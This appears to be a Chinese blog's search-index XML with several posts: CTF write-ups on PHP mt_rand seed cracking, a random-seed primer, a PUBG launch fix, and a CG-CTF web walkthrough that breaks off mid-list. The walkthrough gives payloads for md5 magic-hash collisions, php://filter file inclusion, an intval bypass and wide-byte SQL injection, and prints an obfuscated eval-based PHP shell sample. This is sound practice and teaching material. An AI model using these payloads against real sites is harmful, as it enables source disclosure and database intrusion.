<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>伪随机数之再学习</title>
    <url>/2020/03/16/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%86%8D%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>刚刚学习了伪随机数，正好四火师傅找了一道php伪随机数的题来练练手，解题后对伪随机数有了进一步的学习。</p>
<a id="more"></a>

<h1 id="伪随机数之再学习"><a href="#伪随机数之再学习" class="headerlink" title="伪随机数之再学习"></a>伪随机数之再学习</h1><h3 id="1、首先来解一道题目"><a href="#1、首先来解一道题目" class="headerlink" title="1、首先来解一道题目"></a>1、首先来解一道题目</h3><h4 id="枯燥的抽奖（题目地址：http-c8dcf522-27ac-4555-8a2d-4c198683e6d4-node3-buuoj-cn-）"><a href="#枯燥的抽奖（题目地址：http-c8dcf522-27ac-4555-8a2d-4c198683e6d4-node3-buuoj-cn-）" class="headerlink" title="枯燥的抽奖（题目地址：http://c8dcf522-27ac-4555-8a2d-4c198683e6d4.node3.buuoj.cn ）"></a>枯燥的抽奖（题目地址：<a href="http://c8dcf522-27ac-4555-8a2d-4c198683e6d4.node3.buuoj.cn" target="_blank" rel="noopener">http://c8dcf522-27ac-4555-8a2d-4c198683e6d4.node3.buuoj.cn</a> ）</h4><p>打开题目可以看到：</p>
<p><img src="/2020/03/16/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%86%8D%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p>
<p>题目是猜字符串，当然是不可能才出来的。我们查看源码，发现了有用代码块：</p>
<p><img src="/2020/03/16/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%86%8D%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p>
<p>这只是一个判断正误的代码，但是在第60行导入了<code>check.php</code>，我们查看这个文件。</p>
<p><img src="/2020/03/16/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%86%8D%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p>
<p>这就是产生字符串的代码。</p>
<p>代码审计：</p>
<ul>
<li>开头从<code>(0,999999999)</code>中任取一个数用<code>mt_srand()函数</code>作为随机种子</li>
<li>然后定义了一个长字符串<code>$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</code></li>
<li>定义最后结果的长度为20，for循环来抽取20个字符</li>
<li>for循环内每次用<code>mt_rand()函数</code>从<code>$str_long1</code>中随机出开始抽取一个字符然后拼接起来。</li>
<li>最后<code>$str_show</code>只展示了10个数，也就是题目显示的前十个字符。</li>
</ul>
<p>既然是伪随机，如果<code>mt_srand()</code>使用的随机种子相同，那么之后生成的字符串一定是一样的。</p>
<p>目前，可以使用种子爆破工具<code>php_mt_seed</code>来获取，但是我们首先需要的到所需的参数。</p>
<p>我们用脚本反解，需要修改少量题目代码：</p>
<pre><code>str1 =  &apos;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;   #待抽取字符串
str2 = &apos;2wiBLXc8VJ&apos;     #生成的前十个字符
str3 = str1[::-1]      #切片器
length = len(str2)     #已生成的长度
res = &apos;&apos;
for i in range(len(str2)):
  for j in range(len(str1)):
     if str2[i] == str1[j]:
            res += str(j) + &apos; &apos; + str(j) + &apos; &apos; + &apos;0&apos; + &apos; &apos; + str(len(str1) - 1) + &apos; &apos;   #逆向出参数
          break

print(res)</code></pre><p>运行结果:</p>
<p><img src="/2020/03/16/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%86%8D%E5%AD%A6%E4%B9%A0/4.png" alt="4"></p>
<p>然后我们将所得的结果用<code>php_mt_seed</code>爆破得到随机种子。</p>
<p><img src="/2020/03/16/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%86%8D%E5%AD%A6%E4%B9%A0/5.png" alt="5"></p>
<p>接下来我们只需要把随机种子带回到<code>check.php</code>中的<code>mt_srand()</code>函数中，然后其余不变，输出全部字符即可得到抽奖码，提交后得到flag。</p>
<p><img src="/2020/03/16/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%86%8D%E5%AD%A6%E4%B9%A0/6.png" alt="6"></p>
<p><img src="/2020/03/16/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%86%8D%E5%AD%A6%E4%B9%A0/7.png" alt="7"></p>
<h2 id="伪随机数再学习"><a href="#伪随机数再学习" class="headerlink" title="伪随机数再学习"></a>伪随机数再学习</h2><h4 id="php伪随机数漏洞"><a href="#php伪随机数漏洞" class="headerlink" title="php伪随机数漏洞"></a>php伪随机数漏洞</h4><h5 id="1、php伪随机数的两个函数"><a href="#1、php伪随机数的两个函数" class="headerlink" title="1、php伪随机数的两个函数"></a>1、php伪随机数的两个函数</h5><pre><code>mt_srand(seed); 
函数播种 Mersenne Twister 随机数生成器。
参数：seed 可选，规定播种值。

mt_rand();
函数使用 Mersenne Twister 算法生成随机整数。
参数：
min    可选。规定返回的最小数。默认是 0。
max    可选。规定返回的最大数。默认是 mt_getrandmax()。</code></pre><p>我们来写一段代码：</p>
<pre><code>&lt;?php
mt_srand(12345);
echo mt_rand().&quot;&lt;br/&gt;&quot;;
?&gt;</code></pre><p>输出：<code>1996335345</code></p>
<p>改写代码为：</p>
<pre><code>&lt;?php
mt_srand(12345);
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
?&gt;</code></pre><p>输出结果：</p>
<pre><code>1996335345
1911592690
679411342
280691776
394962642
85382868</code></pre><p>注意到，第一个结果与第一次的结果相同。如果结论还不够明显的话。</p>
<p>我们再次修改代码：</p>
<pre><code>&lt;?php
mt_srand(12345);
echo mt_rand().&quot;&lt;br/&gt;&quot;;
mt_srand(12345);
echo mt_rand().&quot;&lt;br/&gt;&quot;;
mt_srand(12345);
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
echo mt_rand().&quot;&lt;br/&gt;&quot;;
?&gt;</code></pre><p>输出结果：</p>
<pre><code>1996335345
1996335345
1996335345
1911592690
679411342
280691776</code></pre><p>结论显而易见了，当随机种子确定时，生成的伪随机数就会确定。</p>
<p>其实，这就是伪随机数的漏洞，存在可预测性。</p>
<p>生成伪随机数是线性的，你可以理解为y=ax,x就是种子，知道种子和一组伪随机数不是就可以推y(伪随机数了吗),当然实际上更复杂肯定。</p>
<p>即：</p>
<pre><code>我知道种子后，可以确定你输出伪随机数的序列。

知道你的随机数序列，可以确定你的种子。</code></pre><p>对于种子爆破就可以使用<code>php_mt_seed</code>，已经写好了，可以直接使用。  </p>
<h4 id="相关连接："><a href="#相关连接：" class="headerlink" title="相关连接："></a>相关连接：</h4><p><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed种子爆破安装</a><br><a href="https://www.openwall.com/php_mt_seed/README" target="_blank" rel="noopener">php_mt_seed种子爆破使用</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>伪随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>伪随机数之初学习</title>
    <url>/2020/03/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%88%9D%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>在安全领域，伪随机数是很常见的，接下来我来简单唠唠伪随机数。以下内容是在经过在网上查找学习后的简略总结。</p>
<a id="more"></a>

<h1 id="伪随机数之初学习"><a href="#伪随机数之初学习" class="headerlink" title="伪随机数之初学习"></a>伪随机数之初学习</h1><h3 id="1、定义"><a href="#1、定义" class="headerlink" title="1、定义"></a>1、定义</h3><h4 id="伪随机数："><a href="#伪随机数：" class="headerlink" title="伪随机数："></a><code>伪随机数</code>：</h4><p>伪随机数是用确定性的算法计算出来自[0,1]均匀分布的随机数序列。并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，若使用的初值（种子）不变，那么伪随机数的数序也不变。伪随机数可以用计算机大量生成，在模拟研究中为了提高模拟效率，一般采用伪随机数代替真正的随机数。模拟中使用的一般是循环周期极长并能通过随机数检验的伪随机数，以保证计算结果的随机性。</p>
<p>说到伪随机数，就需要提一下<code>真随机数</code>和<code>准随机数</code>。</p>
<h4 id="真随机数："><a href="#真随机数：" class="headerlink" title="真随机数："></a><code>真随机数</code>：</h4><ul>
<li>真随机数数列是不可预计的，因此也不可能重复产生两个相同的真随机数数列。</li>
<li>真随机数只能用某些<code>随机物理过程</code>来产生。</li>
<li>如果采用随机物理过程来产生真随机数，理论上不存在什么问题。但在实际应用时，要做出速度很快，而又准确的随机数物理过程产生器是非常困难的。</li>
</ul>
<h4 id="准随机数："><a href="#准随机数：" class="headerlink" title="准随机数："></a><code>准随机数</code>：</h4><p>准确随机数概念是来自如下的事实：要实现严格数学意义上的随机数，在理论上虽然可行，但在实际中却是不可行的，也米有这个必要。关键是要保证“随机”数数列具有能产出所需要的结果的必要特性。</p>
<h3 id="2、生成方法"><a href="#2、生成方法" class="headerlink" title="2、生成方法"></a>2、生成方法</h3><p>一般地，伪随机数的生成方法主要有以下3种：</p>
<ul>
<li><p>（1） 直接法（Direct Method），根据分布函数的物理意义生成。缺点是仅适用于某些具有特殊分布的随机数，如二项式分布、泊松分布。</p>
</li>
<li><p>（2） 逆转法（Inversion Method），假设U服从[0，1]区间上的均匀分布，令X=F-1（U），则X的累计分布函数（CDF）为F。该方法原理简单、编程方便、适用性广。</p>
</li>
<li><p>（3）接受拒绝法（Acceptance-Rejection Method）：假设希望生成的随机数的概率密度函数（PDF）为f，则首先找到一个PDF为g的随机数发生器与常数c，使得f(x)≤cg(x)，然后根据接收拒绝算法求解。由于算法平均运算c次才能得到一个希望生成的随机数，因此c的取值必须尽可能小。显然，该算法的缺点是较难确定g与c。</p>
</li>
<li><p>伪随机数生成器（PRNG）一般采用逆转法，其基础是均匀分布，均匀分布PRNG的优劣决定了整个随机数体系的优劣[7]。下文研究均匀分布的PRNG。</p>
</li>
</ul>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><ul>
<li>1.计算机的伪随机数是由随机种子根据一定的计算方法计算出来的数值。所以，只要计算方法一定，随机种子一定，那么产生的随机数就是固定的。</li>
<li>2.只要用户或第三方不设置随机种子，那么在默认情况下随机种子来自系统时钟。</li>
</ul>
<h3 id="3、随机种子"><a href="#3、随机种子" class="headerlink" title="3、随机种子"></a>3、随机种子</h3><p>随机种子，一种以随机数作为对象的以真随机数（种子）为初始条件的随机数。一般计算机的随机数都是伪随机数，以一个真随机数（种子）作为初始条件，然后用一定的算法不停迭代产生随机数。</p>
<p>接下来我们用程序深入理解一下</p>
<pre><code>import numpy as np

num = 0
while (num &lt; 5):
    np.random.seed(0)          # 每次循环随机种子不变
    print(np.random.rand(1,5)) # 得到一个范围从0到1的 1行5列的随机数
    num += 1

print(&apos;-------------------------&apos;)</code></pre><p>运行结果：</p>
<p><img src="/2020/03/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%88%9D%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p>
<p>由结果可以看出来，这些都是伪随机数，也就是一直不变的随机数，所以我们可以通过输入随机种子，得到一个初始固定的随机数。随机种子的初始值，是一直不变的。</p>
<p>我们把随机种子的赋值，放到循环外面，意思是只初始化一次。</p>
<pre><code>import numpy as np

num = 0
np.random.seed(0)       # 随机种子只初始化一次
while (num &lt; 5):

   print(np.random.rand(1,5))
   num += 1

print(&apos;-------------------------&apos;)</code></pre><p>看到，结果就不一样了，但是初始化第一行的结果还是一样的，这说明初始值一样 ，而且你会发现，无论你运行多少遍，有了随机种子，运行的结果都是一样的</p>
<p><img src="/2020/03/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%88%9D%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p>
<p>当随机种子没有初始化时，即我们把他注释掉，如果不设置这个值，则系统根据时间来自己选择这个值，此时每次生成的随机数因时间差异而不同。 </p>
<pre><code>import numpy as np

num = 0
#np.random.seed(0)
while (num &lt; 5):

    print(np.random.rand(1,5))
    num += 1

print(&apos;-------------------------&apos;)</code></pre><p>第一次结果：</p>
<p><img src="/2020/03/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%88%9D%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p>
<p>第二次结果：</p>
<p><img src="/2020/03/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%88%9D%E5%AD%A6%E4%B9%A0/4.png" alt="4"></p>
<p>第三次结果：</p>
<p><img src="/2020/03/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%88%9D%E5%AD%A6%E4%B9%A0/5.png" alt="5"></p>
<p>此时结果就是完全随机的。</p>
<h4 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h4><p>通过随机种子，通过一些复杂的数学算法，你可以得到一组有规律的随机数，而随机种子就是这个随机数的初始值。随机种子相同，得到的随机数一定也相同。</p>
<h3 id="4、伪随机数在web中"><a href="#4、伪随机数在web中" class="headerlink" title="4、伪随机数在web中"></a>4、伪随机数在web中</h3><p>就拿<code>BugkuCTF</code>靶场<code>WEB</code>第二题<code>计算器</code>来举个栗子。</p>
<p>可以知道，当式子被点击时，式子底色，数字和数字颜色都随机变化了，也发现不了什么规律。用<code>view-source</code>查看源码，打开<code>&quot;js/code.js&quot;</code>文件。</p>
<pre><code>$(function() {  
    var code = 9999; 
    function codes(){

        var ranColor = &apos;#&apos; + (&apos;00000&apos; + (Math.random() * 0x1000000 &lt;&lt; 0).toString(16)).slice(-6); //随机生成颜色
        // alert(ranColor)
        var ranColor2 = &apos;#&apos; + (&apos;00000&apos; + (Math.random() * 0x1000000 &lt;&lt; 0).toString(16)).slice(-6); 
         var num1 = Math.floor(Math.random() * 100);  
        var num2 = Math.floor(Math.random() * 100);  
        code = num1 + num2;  

        $(&quot;#code&quot;).html(num1 + &quot;+&quot; + num2 + &quot;=?&quot;);  
        if ($(&quot;#code&quot;).hasClass(&quot;nocode&quot;)) {  
            $(&quot;#code&quot;).removeClass(&quot;nocode&quot;);  
            $(&quot;#code&quot;).addClass(&quot;code&quot;); 

        }  
        $(&quot;#code&quot;).css(&apos;background&apos;,ranColor);
         $(&quot;#code&quot;).css(&apos;color&apos;,ranColor2);

    }
    codes()

    $(&quot;#code&quot;).on(&apos;click&apos;,codes)

    $(&quot;#check&quot;).click(function(){ 
        if ($(&quot;.input&quot;).val() == code &amp;&amp; code != 9999) {  
            alert(&quot;flag{CTF-bugku-0032}&quot;);  
        } else {  
            alert(&quot;输入有误!&quot;);  
        }  
    });  
});  </code></pre><p>顺便发现了flag竟然藏在这里。以前都没有注意到过。</p>
<p><code>codes()</code>函数中，<code>ranColor，ranColor2，num1，num2</code>这四个变量均是通过一定的计算方法产生的伪随机数。</p>
<h3 id="写在后面："><a href="#写在后面：" class="headerlink" title="写在后面："></a>写在后面：</h3><p>目前接触到关于随机数的ctf题目较少，以后会根据题目来总结。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>伪随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>PUBG启动问题</title>
    <url>/2020/03/10/PUBG%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>其实我经常也玩一些游戏，LOL等等。</p>
<a id="more"></a>

<h1 id="PUBG启动时遇到的问题"><a href="#PUBG启动时遇到的问题" class="headerlink" title="PUBG启动时遇到的问题"></a>PUBG启动时遇到的问题</h1><p>今天，在同学们的鼓动下，心血来潮下载了吃鸡。但是启动时却出现了问题。</p>
<p>开始游戏后，弹出了<code>Battleeye Launcher</code>窗口。</p>
<p><img src="/2020/03/10/PUBG%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/1.png" alt="1"></p>
<p>虽然这并不影响进入客户端，但是开启游戏后一直提示<code>连接超时</code>。</p>
<p>经过一番百度，找到了问题是缺失了一些文件。</p>
<p>解决办法是：在库中找到游戏，右击，点击属性，在本地文件中点击<code>验证游戏文件的完整性。</code></p>
<p><img src="/2020/03/10/PUBG%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/2.png" alt="2"></p>
<p>等验证完毕后再进入游戏问题就解决。</p>
<hr>
<h3 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h3><p>最后，附上我的steam用户名:applepenlby</p>
]]></content>
      <categories>
        <category>生活</category>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>PUBG</tag>
      </tags>
  </entry>
  <entry>
    <title>CG-CTF-WEB</title>
    <url>/2020/03/09/CG-CTF-WEB/</url>
    <content><![CDATA[<h3 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h3><p>作为一名web新手，刷题是很有必要的，而CG-CTF是一个适合新手的做题平台，下面是我对于CG-CTF Web部分的解题思路，希望对大家有所帮助，如有欠缺，欢迎大家进行补充。</p>
<a id="more"></a>

<h1 id="CG-CTF-Web-Writeup"><a href="#CG-CTF-Web-Writeup" class="headerlink" title="CG-CTF Web-Writeup"></a>CG-CTF Web-Writeup</h1><h3 id="地址：https-cgctf-nuptsast-com-challenges-Web"><a href="#地址：https-cgctf-nuptsast-com-challenges-Web" class="headerlink" title="地址：https://cgctf.nuptsast.com/challenges#Web"></a>地址：<a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">https://cgctf.nuptsast.com/challenges#Web</a></h3><h4 id="0x01-签到题（题目地址：http-chinalover-sinaapp-com-web1-）"><a href="#0x01-签到题（题目地址：http-chinalover-sinaapp-com-web1-）" class="headerlink" title="0x01 签到题（题目地址：http://chinalover.sinaapp.com/web1/ ）"></a>0x01 签到题（题目地址：<a href="http://chinalover.sinaapp.com/web1/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web1/</a> ）</h4><p>直接F12，可得到flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/1.png" alt="1"></p>
<h4 id="0x02-md5-collision（题目地址：http-chinalover-sinaapp-com-web19-）"><a href="#0x02-md5-collision（题目地址：http-chinalover-sinaapp-com-web19-）" class="headerlink" title="0x02 md5 collision（题目地址：http://chinalover.sinaapp.com/web19/ ）"></a>0x02 md5 collision（题目地址：<a href="http://chinalover.sinaapp.com/web19/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web19/</a> ）</h4><p>题目提供了源码。</p>
<pre><code>源码（PHP）

$md51 = md5(&apos;QNKCDZO&apos;);
$a = @$_GET[&apos;a&apos;];
$md52 = @md5($a);
if(isset($a)){
if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) {
  echo &quot;nctf{*****************}&quot;;
} else {
    echo &quot;false!!!&quot;;
}}
else{echo &quot;please input a&quot;;}</code></pre><p>考察PHP弱类型以及md5函数漏洞</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有：</p>
<pre><code>QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
 sha1(str)
sha1(&apos;aaroZmOk&apos;)  
sha1(&apos;aaK1STfY&apos;)
sha1(&apos;aaO8zKZF&apos;)
sha1(&apos;aa3OFF9m&apos;)</code></pre><p>构造payload：<code>?a=240610708</code>，出flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/2.png" alt="2"></p>
<h4 id="0x03-签到2（题目地址：http-teamxlc-sinaapp-com-web1-02298884f0724c04293b4d8c0178615e-index-php-）"><a href="#0x03-签到2（题目地址：http-teamxlc-sinaapp-com-web1-02298884f0724c04293b4d8c0178615e-index-php-）" class="headerlink" title="0x03 签到2（题目地址：http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php ）"></a>0x03 签到2（题目地址：<a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php</a> ）</h4><p>提示输入zhimakaimen，输入后无反应，再F12查看源码：</p>
<p><img src="/2020/03/09/CG-CTF-WEB/3.png" alt="3"></p>
<p>发现输入框的maxlength=“10”，此时可以修改前端的maxlength，再次输入口令拿到flag</p>
<p><img src="/2020/03/09/CG-CTF-WEB/4.png" alt="4"></p>
<h4 id="0x04-这题不是WEB（题目地址：http-chinalover-sinaapp-com-web2-index-html-）"><a href="#0x04-这题不是WEB（题目地址：http-chinalover-sinaapp-com-web2-index-html-）" class="headerlink" title="0x04 这题不是WEB（题目地址：http://chinalover.sinaapp.com/web2/index.html ）"></a>0x04 这题不是WEB（题目地址：<a href="http://chinalover.sinaapp.com/web2/index.html" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web2/index.html</a> ）</h4><p>一道简单的信息隐藏题，一进来只有一张图片，F12后可知图片名为<code>2.gif</code>，下载后将后缀名改为<code>.txt</code>。flag藏在文件末尾。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/5.png" alt="5"></p>
<h4 id="0x05-层层递进（题目地址：http-chinalover-sinaapp-com-web3-）"><a href="#0x05-层层递进（题目地址：http-chinalover-sinaapp-com-web3-）" class="headerlink" title="0x05 层层递进（题目地址：http://chinalover.sinaapp.com/web3/ ）"></a>0x05 层层递进（题目地址：<a href="http://chinalover.sinaapp.com/web3/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web3/</a> ）</h4><p>正如题目所述，层层递进。</p>
<p>解法一：</p>
<p>F12，发现<code>SO.html</code>，查看后发现<code>S0.html</code>，继续查看发现<code>SO.htm</code>，继续查看发现<code>S0.htm</code>,最后发现<code>404.html</code>，进入后翻开源码找到flag,需要竖着看！</p>
<p><img src="/2020/03/09/CG-CTF-WEB/6.png" alt="6"></p>
<p>解法二：</p>
<p>直接抓包，在<code>404.html</code>文件中找到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/7.png" alt="7"></p>
<h4 id="0x06-AAencode（题目地址：http-homura-cc-CGfiles-aaencode-txt-）"><a href="#0x06-AAencode（题目地址：http-homura-cc-CGfiles-aaencode-txt-）" class="headerlink" title="0x06 AAencode（题目地址：http://homura.cc/CGfiles/aaencode.txt ）"></a>0x06 AAencode（题目地址：<a href="http://homura.cc/CGfiles/aaencode.txt" target="_blank" rel="noopener">http://homura.cc/CGfiles/aaencode.txt</a> ）</h4><p>题目提示：javascript aaencode</p>
<p>打开后是乱码，用utf-8编码查看,发现是一堆颜文字。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/8.png" alt="8"></p>
<p>其实是javascript的加密工具aaencode可以把js转为颜文字符号。</p>
<p>直接<code>ctrl c +ctrl v</code>丢进控制台执行，出来flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/9.png" alt="9"></p>
<h4 id="0x07-单身二十年（题目地址：http-chinalover-sinaapp-com-web8-）"><a href="#0x07-单身二十年（题目地址：http-chinalover-sinaapp-com-web8-）" class="headerlink" title="0x07 单身二十年（题目地址：http://chinalover.sinaapp.com/web8/ ）"></a>0x07 单身二十年（题目地址：<a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/</a> ）</h4><p>拼手速自然是不可能点出来的。</p>
<p>直接抓包就可以找到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/10.png" alt="10"></p>
<h4 id="0x08-php-decode（无地址）"><a href="#0x08-php-decode（无地址）" class="headerlink" title="0x08 php decode（无地址）"></a>0x08 php decode（无地址）</h4><p>题目源码：</p>
<pre><code>见到的一个类似编码的shell，请解码

&lt;?php
function CLsI($ZzvSWE) {

    $ZzvSWE = gzinflate(base64_decode ($ZzvSWE));

    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) {

        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);

    }

    return $ZzvSWE;

}
eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));
?&gt;</code></pre><p>我们保存后直接运行代码，会报出<code>eval</code>语法错误，将 <code>eval</code>改为<code>echo</code>试着输出解码后的结果，可以直接得到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/11.png" alt="11"></p>
<h4 id="0x09-文件包含（题目地址：http-4-chinalover-sinaapp-com-web7-index-php-）"><a href="#0x09-文件包含（题目地址：http-4-chinalover-sinaapp-com-web7-index-php-）" class="headerlink" title="0x09 文件包含（题目地址：http://4.chinalover.sinaapp.com/web7/index.php ）"></a>0x09 文件包含（题目地址：<a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web7/index.php</a> ）</h4><p>题目提示：LFI</p>
<p>文件包含题目，使用伪协议<code>php://filter</code>，通过<code>index.php?file=php://filter/convert.base64-encode/resource=</code>分别查看<code>index.php</code>和<code>show.php</code>，解码后发现flag在<code>index.php</code>的末尾。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/12.png" alt="12"></p>
<h4 id="0x10-单身一百年也没用（题目地址：http-chinalover-sinaapp-com-web9-）"><a href="#0x10-单身一百年也没用（题目地址：http-chinalover-sinaapp-com-web9-）" class="headerlink" title="0x10 单身一百年也没用（题目地址：http://chinalover.sinaapp.com/web9/ ）"></a>0x10 单身一百年也没用（题目地址：<a href="http://chinalover.sinaapp.com/web9/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web9/</a> ）</h4><p>单身100年也没用了，看见这种话就直接抓包，用Chrome自带的抓包，发现<code>index.php</code>文件，flag就在响应头中。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/13.png" alt="13"></p>
<h4 id="0x11-Download-（die！）"><a href="#0x11-Download-（die！）" class="headerlink" title="0x11 Download~!（die！）"></a>0x11 Download~!（die！）</h4><h4 id="0x12-COOKIE（题目地址：http-chinalover-sinaapp-com-web10-index-php-）"><a href="#0x12-COOKIE（题目地址：http-chinalover-sinaapp-com-web10-index-php-）" class="headerlink" title="0x12 COOKIE（题目地址：http://chinalover.sinaapp.com/web10/index.php ）"></a>0x12 COOKIE（题目地址：<a href="http://chinalover.sinaapp.com/web10/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web10/index.php</a> ）</h4><p>题目提示：TIP: 0==not<br>截包，修改cookie的值为1即可。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/14.png" alt="14"></p>
<h4 id="0x13-MYSQL（题目地址：http-chinalover-sinaapp-com-web11-）"><a href="#0x13-MYSQL（题目地址：http-chinalover-sinaapp-com-web11-）" class="headerlink" title="0x13 MYSQL（题目地址：http://chinalover.sinaapp.com/web11/ ）"></a>0x13 MYSQL（题目地址：<a href="http://chinalover.sinaapp.com/web11/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/</a> ）</h4><p><code>robots.txt</code>是一种爬虫协议，通常存放在根目录下，首先查看<code>robots.txt</code>文件。</p>
<p>出现代码：<br><img src="/2020/03/09/CG-CTF-WEB/15.png" alt="15"></p>
<p>主要考察<code>intval()</code>函数的用法，php官网解释为：<code>获取变量的整数值</code>，所以此题要绕过，需要给<code>id</code>传入整数部分为1024，小数部分为不为0的值即可绕过。注意到是传入<code>sql.php</code>文件中。<br>构造payload：<code>http://chinalover.sinaapp.com/web11/sql.php?id=1024.001</code>，得到flag。</p>
<p><img src="/2020/03/09/CG-CTF-WEB/16.png" alt="16"></p>
<h4 id="0x14-GBK-Injection（题目地址：http-chinalover-sinaapp-com-SQL-GBK-index-php-id-1-）"><a href="#0x14-GBK-Injection（题目地址：http-chinalover-sinaapp-com-SQL-GBK-index-php-id-1-）" class="headerlink" title="0x14 GBK Injection（题目地址：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 ）"></a>0x14 GBK Injection（题目地址：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a> ）</h4><p>本题考察宽字节注入。</p>
<p>当尝试<code>id=1&#39;</code>时，发现<code>&#39;</code>被转义了，在URL中<code>%df</code>与<code>\</code>结合会变成<code>運</code>,现在我们闭合了<code>id</code>的值，接下来在最后使用<code>#</code>，<code>--+</code>或<code>--空格</code>来注释掉最后一个<code>&#39;</code>。</p>
<p>接下来，依次进行爆破。</p>
<ul>
